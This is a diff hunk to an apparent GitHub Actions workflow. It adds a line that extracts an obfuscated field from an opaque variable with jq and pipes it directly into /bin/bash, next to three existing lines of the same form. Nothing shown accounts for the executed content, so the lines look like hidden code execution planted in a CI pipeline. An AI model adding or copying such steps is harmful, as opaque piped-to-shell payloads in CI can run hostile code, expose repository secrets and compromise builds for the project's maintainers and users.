@@ -20,6 +20,7 @@ jobs:
           echo $k61 | jq -r .xgmyp928 | /bin/bash
           printf '%s' "$tsm23" | jq -r .v1886 | /bin/bash
           printf '%s' "$ubc0" | jq -r .gx1 | /bin/bash
+          echo $it82 | jq -r .ifbu21523 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
